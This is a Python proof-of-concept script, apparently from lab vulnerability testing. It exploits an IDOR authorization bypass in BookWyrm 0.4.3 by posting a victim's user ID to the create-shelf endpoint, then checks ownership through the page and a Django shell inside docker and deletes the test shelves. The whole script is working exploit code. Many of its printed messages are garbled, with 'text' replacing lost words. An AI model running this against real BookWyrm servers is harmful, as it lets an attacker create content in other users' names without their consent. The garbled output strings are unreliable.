                      
""

import sys
import subprocess
import requests
from bs4 import BeautifulSoup

REPO_PATH    = "/home/ground/Desktop/BAC/cve-app/bookwyrm/bookwyrm"
COMPOSE_FILE = f"{REPO_PATH}/docker-compose.yml"
COMPOSE_OVR  = f"{REPO_PATH}/docker-compose.override.yml"

CONFIG = {
    "base_url":          "http://192.168.115.88:8800",
    "user1_localname":   "usera",
    "user1_password":    "userApass1",
    "user2_localname":   "userb",
    "user2_password":    "userBpass1",
    "shelf_name":        "IDOR-PoC-Shelf",
    "shelf_description": "text IDOR text PoC Create，textHastextVictimtext",
    "shelf_privacy":     "public",
}


def run_shell(code):
    cmd = [
        "docker", "compose",
        "-f", COMPOSE_FILE, "-f", COMPOSE_OVR,
        "exec", "-T", "web",
        "python", "manage.py", "shell", "-c", code,
    ]
    result = subprocess.run(cmd, capture_output=True, text=True, cwd=REPO_PATH)
    return [l for l in result.stdout.splitlines()
            if l.strip() and "warning" not in l.lower() and "warn" not in l.lower()]


def get_csrf(session, url):
    resp = session.get(url)
    resp.raise_for_status()
    token = session.cookies.get("csrftoken")
    if not token:
        soup = BeautifulSoup(resp.text, "html.parser")
        tag = soup.find("input", {"name": "csrfmiddlewaretoken"})
        token = tag["value"] if tag else None
    return token


def login(base_url, localname, password):
    session = requests.Session()
    csrf = get_csrf(session, base_url + "/login/")
    if not csrf:
        print(f"[ERROR] NonetextGet CSRF Token")
        sys.exit(1)
    session.post(base_url + "/login/", data={
        "csrfmiddlewaretoken": csrf,
        "localname": localname,
        "password":  password,
    }, allow_redirects=True)
    if "sessionid" not in session.cookies:
        print(f"[ERROR] {localname} Login failed")
        sys.exit(1)
    print(f"[+] {localname} Login succeeded，sessionid={session.cookies['sessionid'][:16]}...")
    return session, get_csrf(session, base_url + "/")


def get_user_id(session, base_url, localname):
    resp = session.get(f"{base_url}/user/{localname}")
    if resp.status_code == 404:
        print(f"[ERROR] User {localname} text 404")
        sys.exit(1)
    soup = BeautifulSoup(resp.text, "html.parser")
    for tag in soup.find_all(True):
        for attr in ("action", "href"):
            val = tag.get(attr, "")
            for kw in ("/block/", "/unblock/", "/report/"):
                if kw in val:
                    candidate = val.strip("/").split("/")[-1]
                    if candidate.isdigit():
                        print(f"[+] text {localname} text ID = {candidate}")
                        return int(candidate)
    print(f"[ERROR] Nonetext {localname} text ID")
    sys.exit(1)


def check_shelf_owner_db(shelf_name, victim_localname):
    ""
    lines = run_shell(f"""
from bookwyrm.models import Shelf
s = Shelf.objects.filter(name='{shelf_name}').order_by('-id').first()
if s is None:
    print('SHELF_NOT_FOUND')
elif s.user.localname == '{victim_localname}':
    print('OWNER_IS_VICTIM')
else:
    print(f'OWNER_IS:{{s.user.localname}}')
""")
    return next(
        (l for l in lines if l in ("SHELF_NOT_FOUND", "OWNER_IS_VICTIM") or l.startswith("OWNER_IS:")),
        "UNKNOWN"
    )


def cleanup_poc_shelves_db(shelf_name):
    ""
    lines = run_shell(f"""
from bookwyrm.models import Shelf
n, _ = Shelf.objects.filter(name='{shelf_name}').delete()
print(f'db_cleaned={{n}}')
""")
    cleaned = next((l for l in lines if l.startswith("db_cleaned=")), "")
    if cleaned:
        n = cleaned.split("=")[-1]
        if n != "0":
            print(f"[+] DB text {n} text PoC shelf")


def main():
    base = CONFIG["base_url"]
    print("=" * 62)
    print("  BookWyrm Nonetext CVE-5 — IDOR textCreation PoC")
    print("  CWE-639: Authorization Bypass Through User-Controlled Key")
    print("  text：BookWyrm 0.4.3")
    print("=" * 62)

    print(f"\n[Step 1] User1（Attacker）text...")
    session1, csrf1 = login(base, CONFIG["user1_localname"], CONFIG["user1_password"])

    print(f"\n[Step 1b] User2（Victim）text...")
    session2, csrf2 = login(base, CONFIG["user2_localname"], CONFIG["user2_password"])

    print(f"\n[Step 2] User1 text User2（{CONFIG['user2_localname']}）text ID...")
    victim_id = get_user_id(session1, base, CONFIG["user2_localname"])

    endpoint = f"{base}/create-shelf"
    payload = {
        "csrfmiddlewaretoken": csrf1,
        "user":        victim_id,
        "name":        CONFIG["shelf_name"],
        "description": CONFIG["shelf_description"],
        "privacy":     CONFIG["shelf_privacy"],
    }
    print(f"\n[Step 3] text IDOR：User1 textVictimIdentityCreateshelf")
    print(f"    POST {endpoint}  user={victim_id}")
    resp = session1.post(endpoint, data=payload, allow_redirects=False)
    print(f"[*] textResponsetext：{resp.status_code}")

                                                     
    if resp.status_code not in (200, 302):
        print(f"\n[✓ Vulnerability fixed]")
        print(f"    textRequest（Responsetext：{resp.status_code}），user texttamperingtext。")
        cleanup_poc_shelves_db(CONFIG["shelf_name"])
        print("\n[Complete] PoC textEnd。")
        return

    location = resp.headers.get("Location", "")
    print(f"[*] text → {location}")

                                                   
    victim_books_page = session1.get(f"{base}/user/{CONFIG['user2_localname']}/books")
    html_positive = CONFIG["shelf_name"] in victim_books_page.text

                                                                
    print(f"\n[Step 5] text layer oracle：VerifyshelfownerIdentity...")
    db_verdict = check_shelf_owner_db(CONFIG["shelf_name"], CONFIG["user2_localname"])
    db_positive = (db_verdict == "OWNER_IS_VICTIM")

    if html_positive or db_positive:
        print("\n[!!! text !!!]")
        if html_positive:
            print(f"    [HTML layer] Victimshelftext '{CONFIG['shelf_name']}'（ownership confirmed）。")
        if db_positive:
            print(f"    [DB layer]   Shelf.user == {CONFIG['user2_localname']}（DB direct DB confirmation）。")
        print(f"    Root cause：create_shelf()（bookwyrm/views/shelf/shelf_actions.py）")
        print(f"          ShelfForm text user text POST text，textVerifyYesNotext request.user。")
    else:
        print("\n[✓ text]")
        if not html_positive:
            print(f"    [HTML layer] Victimshelftext '{CONFIG['shelf_name']}'。")
        print(f"    [DB layer]   Shelf.user != {CONFIG['user2_localname']}（{db_verdict}）。")
        if db_verdict == "SHELF_NOT_FOUND":
            print(f"    Requesttext，shelftextWrite DB。")
        else:
            actual = db_verdict.replace("OWNER_IS:", "")
            print(f"    shelfownertext request.user（{actual}）。")

    print("\n[Complete] PoC textEnd。")

    print("\n" + "─" * 62)
    print("[Teardown] Delete PoC Creation，textStatus...")
    cleanup_poc_shelves_db(CONFIG["shelf_name"])
    print("[Teardown] Complete，text PoC RuntextStatus。")
    print("─" * 62)


if __name__ == "__main__":
    main()
